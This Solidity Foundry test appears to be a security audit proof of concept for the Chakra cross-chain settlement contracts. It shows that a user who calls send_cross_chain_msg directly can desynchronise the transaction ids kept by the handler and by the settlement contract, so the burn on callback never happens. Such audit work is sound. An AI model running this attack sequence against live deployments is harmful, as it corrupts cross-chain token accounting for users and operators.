// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "../../../lib/forge-std/src/Test.sol"; 

import {ChakraSettlementHandler} from "../../../solidity/handler/contracts/ChakraSettlementHandler.sol"; 

import {BaseSettlementHandler} from "../../../solidity/handler/contracts/BaseSettlementHandler.sol"; 

import {ChakraToken} from "../../../solidity/handler/contracts/ChakraToken.sol"; 

import {ERC20CodecV1} from "../../../solidity/handler/contracts/ERC20CodecV1.sol"; 

import {IERC20CodecV1} from "../../../solidity/handler/contracts/interfaces/IERC20CodecV1.sol"; 

import {ChakraSettlement} from "../../../solidity/settlement/contracts/ChakraSettlement.sol";

import {SettlementSignatureVerifier} from "../../../solidity/handler/contracts/SettlementSignatureVerifier.sol";

import {ISettlementSignatureVerifier} from "../../../solidity/handler/contracts/interfaces/ISettlementSignatureVerifier.sol";

import {ISettlement} from "../../../solidity/handler/contracts/interfaces/ISettlement.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { PayloadType, CrossChainMsgStatus } from "../../../solidity/settlement/contracts/libraries/Message.sol";

import {ERC20TransferPayload} from "../../../solidity/handler/contracts/libraries/ERC20Payload.sol";

import {ERC20Method} from "../../../solidity/handler/contracts/libraries/ERC20Payload.sol";

import {AddressCast} from "../../../solidity/handler/contracts/libraries/AddressCast.sol";

import {Message} from "../../../solidity/settlement/contracts/libraries/Message.sol";

import {MessageV1Codec} from "../../../solidity/settlement/contracts/libraries/MessageV1Codec.sol";

contract GeneralTestMintBurn is Test{

    uint256 ethFork; 
    uint256 arbFork;

//ARB
ChakraSettlementHandler public chakraSettlementHandlerArb; 

ChakraToken public chakraTokenArb;

ERC20CodecV1 public codecArb; 

ChakraSettlement public chakraSettlementArb; 

SettlementSignatureVerifier public settlementSignatureVerifierArb; 

//ETH
ChakraSettlementHandler public chakraSettlementHandlerEth; 

ChakraToken public chakraTokenEth;

ERC20CodecV1 public codecEth; 

ChakraSettlement public chakraSettlementEth; 

SettlementSignatureVerifier public settlementSignatureVerifierEth; 

address public bob = makeAddr("bob");
address public tob = makeAddr("tob");

ChakraToken chakraToken_arb; 
ChakraToken chakraToken_eth; 

address public owner; 
   
function setUp() public {
initializeOnArbitrum();
initializeOnEthereum();
}

function initializeOnArbitrum() public {
arbFork = vm.createFork("use your own rpc url");
vm.selectFork(arbFork);
owner = address(this); 

//settlementSignatureVerifier 
settlementSignatureVerifierArb = new SettlementSignatureVerifier(); 
//settlementSignatureVerifier initialized
settlementSignatureVerifierArb.initialize(address(this), 1);

//chakraToken
chakraToken_arb = new ChakraToken(); 
//chakraToken initialized
chakraToken_arb.initialize(address(this), address(this), "ChakraToken", "CKT", 18);

//codec
codecArb = new ERC20CodecV1(); 
//codec initialized
codecArb.initialize(address(this));

//chakraSettlement
chakraSettlementArb = new ChakraSettlement();
address[] memory managers = new address[](2); 
managers[0] = bob; 
managers[1] = tob; 
chakraSettlementArb.initialize("Abitrum", 137, owner, managers, 1, address(settlementSignatureVerifierArb));

//chakraSettlementHandler
chakraSettlementHandlerArb = new ChakraSettlementHandler();
chakraSettlementHandlerArb.initialize(owner, BaseSettlementHandler.SettlementMode.MintBurn, "Arbitrum", address(chakraToken_arb), address(codecArb), address(settlementSignatureVerifierArb), address(chakraSettlementArb));

//add validator in chakra token
chakraToken_arb.add_operator(address(chakraSettlementHandlerArb));
}

function initializeOnEthereum() public {
ethFork = vm.createFork("use your own rpc url");
vm.selectFork(ethFork);
owner = address(this); 

//settlementSignatureVerifier 
settlementSignatureVerifierEth = new SettlementSignatureVerifier(); 
//settlementSignatureVerifier initialized
settlementSignatureVerifierEth.initialize(address(this), 1);

//chakraToken
chakraToken_eth = new ChakraToken(); 
//chakraToken initialized
chakraToken_eth.initialize(address(this), address(this), "ChakraToken", "CKT", 18);

//codec
codecEth = new ERC20CodecV1(); 
//codec initialized
codecEth.initialize(address(this));

//chakraSettlement
chakraSettlementEth = new ChakraSettlement();
address[] memory managers = new address[](2); 
managers[0] = bob; 
managers[1] = tob; 
chakraSettlementEth.initialize("Ethereum", 1, owner, managers, 1, address(settlementSignatureVerifierEth));

//chakraSettlementHandler
chakraSettlementHandlerEth = new ChakraSettlementHandler();
chakraSettlementHandlerEth.initialize(owner, BaseSettlementHandler.SettlementMode.MintBurn, "Ethereum", address(chakraToken_eth), address(codecEth), address(settlementSignatureVerifierEth), address(chakraSettlementEth));

//add validator in chakra token
chakraToken_eth.add_operator(address(chakraSettlementHandlerEth));
}

//@audit medium, transaction ids between chakra handler and chakra settlement may not be unique, this may happens if malicious users calls 'directly 'send_cross_chain_msg' updating their nonce_manager. 
//By doing so the txId calculated in the handler contact will be different that that created on the settlement contract.
//If this happens, when a callback is performed, if the handler is in mode MintBurn mode, no burn will be done since the txId will be differents and the call will fail.
function test_TransactionIdsMayBeNotUnique() public {
//Note: the required validators is setted to 1, all the contracts have been initialized and the handlers mode is set to MintBurn.
uint256 privateKeyValidator1 = 0x12D; 
address validator1 = vm.addr(privateKeyValidator1);

address User = makeAddr("User");

//Add managers to both chains (arbitrum and ethereum).
vm.selectFork(arbFork);
vm.startPrank(owner);
settlementSignatureVerifierArb.add_manager(bob);
vm.selectFork(ethFork);
settlementSignatureVerifierEth.add_manager(bob);
vm.stopPrank(); 

//Add validators to both chains (arbitrum and ethereum).
vm.startPrank(bob);
settlementSignatureVerifierEth.add_validator(validator1);
vm.selectFork(arbFork);
settlementSignatureVerifierArb.add_validator(validator1);
vm.stopPrank();

//add valid arbitrum handler on ethereum
vm.selectFork(ethFork);
vm.startPrank(owner); 
chakraSettlementHandlerEth.add_handler("Arbitrum", uint160(address(chakraSettlementHandlerArb)));
vm.stopPrank();

vm.startPrank(User);
vm.selectFork(arbFork);

//Initial call to 'ChakraSettlement::send_cross_chain_msg'
//Here malicious user calls this function in order to update his nonce manager in the settlement contract by 1
chakraSettlementArb.send_cross_chain_msg("Ethereum", User, uint160(address(chakraSettlementHandlerEth)), PayloadType.ERC20, "");
//As we can see the nonce manager of the user in the settlement contract is already 1, that means that when the call from the handler will happen, the nonce manager in the settlement contract will be 2
assertEq(chakraSettlementArb.nonce_manager(User), 1);

//payload 
//Here there is a anticipated calculation of the cross chain tx payload, that will be used later in this test
bytes memory payload;
uint256 crosschain_counter_msg = 1; 
//The nonce used is 1 because when the call will be done from the handler contract, the nonce manager of the user will result 1
uint256 nonce = 1; 
uint256 cross_chain_msg_id = uint256(keccak256(abi.encodePacked(crosschain_counter_msg,address(chakraSettlementHandlerArb), User,nonce)));

ERC20TransferPayload memory _payload = ERC20TransferPayload(
ERC20Method.Transfer, 
AddressCast.to_uint256(User), 
uint160(User),
AddressCast.to_uint256(address(chakraToken_arb)),
uint160(address(chakraToken_eth)), 
100e18
);

Message memory cross_chain_msg = Message(
cross_chain_msg_id, 
PayloadType.ERC20, 
codecArb.encode_transfer(_payload)
);

payload = MessageV1Codec.encode(cross_chain_msg);

//Give 100 chakra token to user on arb
deal(address(chakraToken_arb), User, 100e18); 
//Approve the handler 
IERC20(address(chakraToken_arb)).approve(address(chakraSettlementHandlerArb), 100e18);

//The user calls the arbitrum handler to perform his cross chain tx and he locks 100 chakra tokens
chakraSettlementHandlerArb.cross_chain_erc20_settlement("Ethereum", uint160(address(chakraSettlementHandlerEth)), uint160(address(chakraToken_eth)), uint160(User), 100e18);
vm.stopPrank();

//These are the transactions ids in 'create_cross_tx' emitted by the settlement and the handler contracts on Arbitrum.
uint256 txIdSettlement = 114043303906640166137894546525275583892180774572762066073209128604284326809211;
uint256 txIdHandler = 79299653854171723762050068649759814756549755735348995235466188915960303563146;
//As we can see, these txId are not the same
assertNotEq(txIdSettlement, txIdHandler);

vm.startPrank(validator1);
uint8 sign_type = 0; 
//The validator signs the message and accepts the transaction
(uint8 v,bytes32 r, bytes32 s) = vm.sign(privateKeyValidator1, 0x5b9d3cd0dcbfcf883660cdecc679458598a733e82807598e32925eb53aaf0167);//Here we can note a byte value, it is the message_hash and has been retrieved using the Foundry console with the command -vvv
bytes memory signature = abi.encodePacked(r, s, v);

vm.selectFork(ethFork);
//The validator calls 'receive_cross_chain_msg' on the destination chain (Ethereum) with the tx Id of the settlement contract
chakraSettlementEth.receive_cross_chain_msg(txIdSettlement, "Abitrum", uint160(User), uint160(address(chakraSettlementHandlerArb)), address(chakraSettlementHandlerEth), PayloadType.ERC20, payload, sign_type, signature);

//Then, the event 'CrossChainHandleResult' is emitted with the txId of the settlement contract, and so, the validator call 'receive_cross_chain_callback' on the source chain (Arbitrum)
vm.selectFork(arbFork);
//The validator signs the message and accepts the transaction for the callback on the source chain
(uint8 vCallback,bytes32 rCallback, bytes32 sCallback) = vm.sign(privateKeyValidator1, 0x6fae62cdc6f721f39a9a241abea410cfb2433e039228067dfd5811d9dedbf4f6);//Here we can note a byte value, it is the message_hash and has been retrieved using the Foundry console with the command -vvv
bytes memory signatureCallback = abi.encodePacked(rCallback, sCallback, vCallback);
chakraSettlementArb.receive_cross_chain_callback(txIdSettlement, "Ethereum", uint160(address(chakraSettlementHandlerEth)), address(chakraSettlementHandlerArb), CrossChainMsgStatus.Success, sign_type, signatureCallback);

//Since the tx ids between handler and settlement are differents, the handler did not burned the tokens
assertEq(IERC20(chakraToken_arb).balanceOf(address(chakraSettlementHandlerArb)), 100e18); 

(uint256 txId_handler , , , , , , , , ) = chakraSettlementHandlerArb.create_cross_txs(txIdHandler);
(uint256 txId_settlement , , , , , , , ) = chakraSettlementArb.create_cross_txs(txIdSettlement);
assertEq(txIdHandler, txId_handler); 
assertEq(txIdSettlement, txId_settlement);

//As we can see, the transactions ids between handler and the settlement contracts are not unique and equals.
assertNotEq(txId_handler, txId_settlement);
}
}